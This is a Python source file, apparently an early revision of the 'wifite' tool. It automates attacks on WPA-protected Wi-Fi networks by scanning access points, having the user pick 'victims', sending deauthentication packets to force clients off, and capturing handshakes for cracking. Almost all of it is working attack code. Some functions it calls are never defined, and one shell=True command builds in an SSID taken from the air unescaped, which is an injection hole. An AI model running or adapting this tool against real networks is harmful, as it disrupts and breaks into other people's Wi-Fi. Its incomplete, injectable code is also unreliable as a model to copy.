#!/usr/bin/python

# For command-line arguments
from sys import argv
# For flushing STDOUT
from sys import stdout

# For file management
import os

# For executing and reading processes
from subprocess import Popen, call, PIPE

# For killing processes
from signal import SIGTERM

import time

# regular expressions - for converting SSID to filename
import re

REVISION = 83

# WPA variables
STRIP_HANDSHAKE   = True # use pyrit or tshark (if applicable) to strip handshake.
WPA_TIMEOUT       = 10   # in seconds
WPA_CAPS_TO_CRACK = []   # list of .cap files to crack (full of CapFile objects)

# Program variables
TARGETS_REMAINING = 0

# Console colors
W  = "\033[0m"  # white (normal)
R  = "\033[31m" # red
G  = "\033[32m" # green
O  = "\033[33m" # orange
B  = "\033[34m" # blue
P  = "\033[35m" # purple
C  = "\033[36m" # cyan
GR = "\033[37m" # gray


# Create temporary directory (temp)
from tempfile import mkdtemp
temp = mkdtemp(prefix='wifite')
if not temp.endswith(os.sep):
	temp += os.sep

DN = open(os.devnull, 'w')

class CapFile:
	def __init__(self, filename, ssid):
		self.filename = filename
		self.ssid = ssid

class Target:
	"""
		Holds data for a Target (aka Access Point aka Router)
	"""
	def __init__(self, bssid, power, data, channel, encryption, ssid):
		self.bssid = bssid
		self.power = power
		self.data  = data
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
	
	def __str__(self):
		s  = 'TARGET\n'
		s += ' BSSID=%s\n' % self.bssid
		s += ' POWER=%s\n' % self.power
		s += ' DATA=%s\n' % self.data
		s += ' CHANNEL=%s\n' % self.channel
		s += ' ENCRYPTION=%s\n' % self.encryption
		s += ' SSID=%s\n' % self.ssid
		return s

class Client:
	"""
		Holds data for a Client (device connected to Access Point/Router)
	"""
	def __init__(self, bssid, station, power):
		self.bssid   = bssid
		self.station = station
		self.power   = power
	
	def __str__(self):
		s  = 'CLIENT\n'
		s += ' BSSID=%s\n' % self.bssid
		s += ' STATION=%s\n' % self.station
		s += ' POWER=%s\n' % self.power
		return s


def scan(channel=0, iface='', bssid=''):
	"""
		Scans for access points. Asks user to select target(s).
		Returns list of selected targets and list of clients.
	"""
	remove_airodump_files('wifite')
	
	command = ['airodump-ng', 
						'-a', # only show associated clients
						'-w', temp + 'wifite'] # output file
	if channel != 0:
		command.append('-c')
		command.append(str(channel))
	if bssid != '':
		command.append('--bssid')
		command.append(bssid)
	command.append(iface)
	proc = Popen(command, stdout=DN, stderr=DN)
	
	print ' initializing scan. updates occur at 5 second intervals. Ctrl+C when ready.'
	(targets, clients) = ([], [])
	try:
		while True:
			time.sleep(0.3)
			if not os.path.exists(temp + 'wifite-01.csv'):
				print R + ' unable to generate airodump-ng CSV'
				print R + ' you may want to disable & re-enable your wifi device'
				exit_gracefully(1)
			
			(targets, clients) = parse_csv(temp + 'wifite-01.csv')
			print "\r scanning. %d target%s and %d client%s found" % (
						len(targets), '' if len(targets) == 1 else 's', 
						len(clients), '' if len(clients) == 1 else 's'),
			stdout.flush()	
	except KeyboardInterrupt: pass
	
	os.kill(proc.pid, SIGTERM)
	
	print ''
	
	if len(targets) == 0:
		print R + ' no targets found!'
		print ' you may need to wait for targets to show up.'
		print ' the program will now exit.'
		exit_gracefully(1)
	
	# Sort by Power
	targets = sorted(targets, key=lambda t: t.power)
	victims = []
	print " please select one or more targets:"
	for i, target in enumerate(targets):
		print "   %2d) %s %3s%4sdb" % (i + 1, target.ssid.ljust(20), \
										target.encryption.strip().replace("2WPA", "").ljust(4),
										target.power),
		
		has_client = False
		for c in clients:
			if c.station == target.bssid: has_client = True
		if has_client: print '*CLIENT*'
		else: print ''
	
	print " select target, multiple separated by commas (1-%s), or 'all':" % len(targets),
	ri = raw_input()
	if ri.strip().lower() == 'all':
		victims = targets[:]
	else:
		for r in ri.split(','):
			r = r.strip()
			if r.find('-') != -1:
				(sx, sy) = r.split('-')
				if sx.isdigit() and sy.isdigit():
					x = int(sx)
					y = int(sy) + 1
					for v in xrange(x, y):
						victims.append(targets[v - 1])
			elif not r.isdigit():
				print " not a number: %s" % r
			else:
				victims.append(targets[int(r) - 1])
			
		
	if len(victims) == 0:
		print ' no victims selected. exiting'
		exit_gracefully(0)
	
	for vic in victims:
		print str(vic)
	
	return (victims, clients)

def parse_csv(filename):
	"""
		Parses given lines from airodump-ng CSV file.
		Returns tuple: List of targets and list of clients.
	"""
	f = open(filename)
	lines = f.read().split('\n')
	f.close()
	
	hit_clients = False
	targets = []
	clients = []
	for line in lines:
		if line.find('Station MAC,') != -1: hit_clients = True
		if line.startswith('BSSID') or line.startswith('Station MAC') or line.strip() == '': continue
		if not hit_clients: # Access points
			c = line.split(', ', 13)
			cur = 11
			c[cur] = c[cur].strip()
			if not c[cur].isdigit(): cur += 1
			ssid = c[cur+1]
			ssidlen = int(c[cur])
			ssid = ssid[:ssidlen]
			t = Target(c[0], c[cur-4], c[cur-2].strip(), c[3], c[5], ssid)
			if c[5].find('OPN') != -1: continue # Ignore "open" networks.
			targets.append(t)
		else: # Connected clients
			c = line.split(', ')
			bssid   = re.sub(r'[^a-zA-Z0-9:]', '', c[0])
			station = re.sub(r'[^a-zA-Z0-9:]', '', c[5])
			power   = c[3]
			if station != 'notassociated':
				c = Client(bssid, station, power)
				clients.append(c)
	return (targets, clients)

def get_iface():
	"""
		Get the wireless interface in monitor mode. 
		Defaults to only device in monitor mode if found.
		Otherwise, enumerates list of possible wifi devices
		and asks user to select one to put into monitor mode.
		Uses airmon-ng to put device in monitor mode if needed.
		Returns the name (String) of the interface chosen in monitor mode.
	"""
	proc  = Popen(['iwconfig'], stdout=PIPE,stderr=PIPE)
	txt   = proc.communicate()[0]
	iface = ''
	monitors = []
	for line in txt.split('\n'):
		if len(line) == 0: continue
		if ord(line[0]) != 32: # Doesn't start with space
			iface = line[:line.find(' ')] # is the interface
		if line.find('Mode:Monitor') != -1:
			monitors.append(iface)
	
	# only one device
	if len(monitors) == 1: return monitors[0]
	elif len(monitors) > 1:
		print " Interfaces in monitor mode:"
		for i, monitor in enumerate(monitors):
			print "  %d. %s" % (i + 1, monitor)
		i = get_input(stop=len(monitors))
		return monitors[i - 1]
	
	proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=PIPE)
	txt   = proc.communicate()[0]
	for line in txt.split('\n'):
		if len(line) == 0 or line.startswith('Interface'): continue
		monitors.append(line[:line.find('\t')])
	
	if len(monitors) == 0:
		print R + " No wireless interfaces were found."
		print R + " You need to plug in a wifi device or install drivers."
		print R + " The program will now exit."
		exit_gracefully(0)
	
	print " Select a device to put into monitor mode:"
	for i, monitor in enumerate(monitors):
		print "  %d. %s" % (i + 1, monitor)
	i = get_input(stop=len(monitors))
	call(['airmon-ng', 'start', monitors[i-1]], stdout=DN, stderr=DN)
	return get_iface() # recursive call

def get_input(start=1, stop=1, message=''):
	if message == '': message = ' enter a number between %s and %s:' % (start, stop)
	i = -1
	while i < start or i > stop:
		print message,
		ri = raw_input()
		try:
			i = int(ri)
		except ValueError:
			print 'invalid input, try again.'
		else:
			if i < start or i > stop:
				print 'invalid input, try again.'
	return i

def handle_args():
	"""
		Handles command-line arguments, sets variables.
	"""
	args = argv[1:]
	print "Arguments: %s" % str(args)


def has_handshake(target, capfile):
	"""
		Checks if .cap file contains a handshake.
		Returns True if handshake is found, False otherwise.
	"""
	# Check for handshake using Pyrit if applicable
	if program_exists('pyrit'):
		# Call pyrit to "Analyze" the cap file's handshakes.
		cmd = ['pyrit',
					 '-r', capfile + '.temp',
					 'analyze']
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		hit_essid = False
		for line in proc.communicate()[0].split('\n'):
			# Iterate over every line of output by Pyrit
			if line == '' or line == None: continue
			if line.find("AccessPoint") != -1:
				hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
										(line.lower().find(target.bssid.lower()))
				
			# If Pyrit says it's good or workable, it's a valid handshake.
			if hit_essid and \
				(line.find(', good, ') != -1 or \
				line.find(', workable, ') != -1):
				# or line.find(', bad, ') != -1:
				# Although I have cracked "bad" handshakes before, commenting out anyway.
				return True
		return False
		
	# Check for handshake using aircrack-ng
	elif program_exists('aircrack-ng'):
		crack = 'echo "" | aircrack-ng -a 2 -w - -e "' + target.ssid + '" ' + temp + 'wpa-01.cap'
		proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
		proc_crack.wait()
		txt = proc_crack.communicate()[0]
		
		return txt.find('Passphrase not in dictionary') != -1
	
	print "\n aircrack-ng not found; Wifite is unable to check for handshakes!"
	print " Please install aircrack-ng before running this script."
	gracefully_exit(-1)


def remove_airodump_files(prefix):
	"""
		Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
		Used by attack_wpa() and attack_wep()
	"""
	try: 
		os.remove(prefix + '-01.cap')
		os.remove(prefix + '-01.csv')
		os.remove(prefix + '-01.kismet.csv')
		os.remove(prefix + '-01.kismet.netxml')
	except OSError: pass


def program_exists(program):
	"""
		Uses 'which' (linux command) to check if a program is installed.
	"""
	proc = Popen(['which', program], stdout=PIPE)
	return proc.communicate()[0].strip() != ''


def attack_wpa(iface, target, clients):
	""" 
		Opens an airodump capture on the target, dumping to a file.
		During the capture, sends deauthentication packets to the target both as
		general deauthentication packets and specific packets aimed at connected clients.
		Waits until a handshake is captured.
	"""
	
	global STRIP_HANDSHAKE, WPA_TIMEOUT, TARGETS_REMAINING
	
	# Generate the filename to save the .cap file as
	save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '.cap'
	
	# Check if we already have a handshake for this SSID...
	if os.path.exists(save_as):
		print '.cap file already exists for %s, skipping.' % target.ssid
		return ''
		"""
		save_index = 1
		while os.path.exists("hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'):
			save_index += 1
		save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'
		"""
	
	# Remove previous airodump output files (if needed)
	remove_airodump_files(temp + 'wpa')
	
	result = ''
	
	# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
	try:
		# Start airodump-ng process to capture handshakes
		cmd = ['airodump-ng', 
					'-w', temp + 'wpa', 
					'-c', target.channel, 
					'--bssid', target.bssid, iface]
		proc_read = Popen(cmd, stdout=DN, stderr=DN)
		
		print 'starting wpa handshake capture'
		got_handshake = False
		
		target_clients = []
		client_index = -1
		# Build list of clients solely connected to target access point
		for c in clients:
			if c.station == target.bssid:
				target_clients.append(c)
		
		# Deauth and check-for-handshake loop
		while not got_handshake:
			# Send deauth packets via aireplay-ng
			cmd = ['aireplay-ng', 
						'-0',  # Attack method (Deauthentication)
						 '3',  # Number of packets to send
						'-a', target.bssid]
			
			if client_index == -1: 
				print "sending 3 deauth packets from *broadcast*",
			elif len(target_clients) > 0:
				print "sending 3 deauth packets from %s" % target_clients[client_index].bssid,
				cmd.append('-h')
				cmd.append(target_clients[client_index].bssid)
			
			client_index += 1
			if client_index >= len(target_clients): client_index = -1
			cmd.append(iface)
			
			# Send deauth packets via aireplay, wait for them to complete.
			proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
			proc_deauth.wait()
			print "sent"
			
			# Copy current dump file (take snapshot of it)
			call(['cp', temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp'])
			
			# Check for handshake using aircrack
			if has_handshake(target, temp + 'wpa-01.cap.temp'):
				got_handshake = True
				
				try: os.mkdir('hs' + os.sep)
				except OSError: pass
				
				# Kill the airodump and aireplay processes
				try:
					os.kill(proc_read.pid, SIGTERM)
					os.kill(proc_deauth.pid, SIGTERM)
				except OSError: pass
				# except UnboundLocalError: pass
				
				# Copy the cap file for safe-keeping
				try: os.rename(temp + 'wpa-01.cap.temp', save_as)
				except OSError:
					call(['mv', temp + 'wpa-01.cap.temp', save_as])
				
				print 'handshake captured! saved as "' + save_as + '"'
				
				# strip handshake if user requested it
				if STRIP_HANDSHAKE:
					if program_exists('pyrit'):
						cmd = ['pyrit',
								 '-r', save_as,
								 '-o', save_as,
								 'strip']
						call(cmd,stdout=DN, stderr=DN)
						
					elif program_exists('tshark'):
						# strip results with tshark
						cmd = ['tshark',
									 '-r', save_as,      # input file
									 '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
									 '-w', save_as + '.temp'] # output file
						proc_strip = call(cmd, stdout=DN, stderr=DN)
						
						try: os.rename(save_as + '.temp', save_as)
						except OSError:
							call(['mv', save_as + '.temp', save_as])
				
				# add the filename and SSID to the list of 'to-crack' after everything's done
				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid))
				break
				
			# no handshake yet
			time.sleep(WPA_TIMEOUT)
			
			# Check the airodump output file for new clients
			for client in parse_csv(temp + 'wpa-01.csv')[1]:
				if client.station != target.bssid: continue
				new_client = True
				for c in target_clients:
					if client.bssid == c.bssid: 
						new_client = False
						break
				
				if new_client:
					print "new client found: %s" % client.bssid
					target_clients.append(client)
			
		# End of Handshake wait loop.
		
		if not got_handshake:
			print "unable to capture handshake in time"
	
	except KeyboardInterrupt: 
		print " (^C) attack interrupted"
		# TODO Menu system to either continue attacking or start cracking.
		if TARGETS_REMAINING > 0:
			print " %d targets remain" % TARGETS_REMAINING
			print " please make a selection:"
			print "   [c]ontinue attacking targets"
			if len(WPA_CAPS_TO_CRACK) > 0:
				print "   [s]kip to cracking WPA cap files"
			print "   [e]xit completely"
			ri = ''
			while ri != 'c' and ri != 's' and ri != 'e': 
				ri = raw_input()
			if ri == 's':
				TARGETS_REMAINING = 0
			elif ri == 'e':
				print " the program will now exit."
				exit_gracefully(0)
				
	
	# clean up
	remove_airodump_files(temp + 'wpa')
	try:
		os.kill(proc_read.pid, SIGTERM)
		os.kill(proc_deauth.pid, SIGTERM)
	except OSError: pass
	#except UnboundLocalError: pass
	


def start():
	global TARGETS_REMAINING
	
	iface = get_iface()
	(targets, clients) = scan(iface=iface)
	
	TARGETS_REMAINING = len(targets)
	for t in targets:
		TARGETS_REMAINING -= 1
		print "TARGET: %s (%s)" % (t.ssid, t.bssid)
		
		ts_clients = []
		for c in clients:
			if c.station == t.bssid:
				print "\tCLIENT: %s" % (c.bssid)
				ts_clients.append(c)
		
		if t.encryption.find('WPA') != -1:
			attack_wpa(iface, t, ts_clients)
			
		elif t.encryption.find('WEP') != -1:
			attack_wep(iface, t, ts_clients)
		
		# If user wants to stop attacking
		if TARGETS_REMAINING == 0: break
		
		else: print ' unknown encryption:',t.encryption

def exit_gracefully(code):
	for file in os.listdir(temp):
		os.remove(temp + file)
	os.rmdir(temp)
	exit(code)

if __name__ == '__main__':
	try:
		start()
	except KeyboardInterrupt:
		print '\n ^C Interrupted'
	exit_gracefully(0)


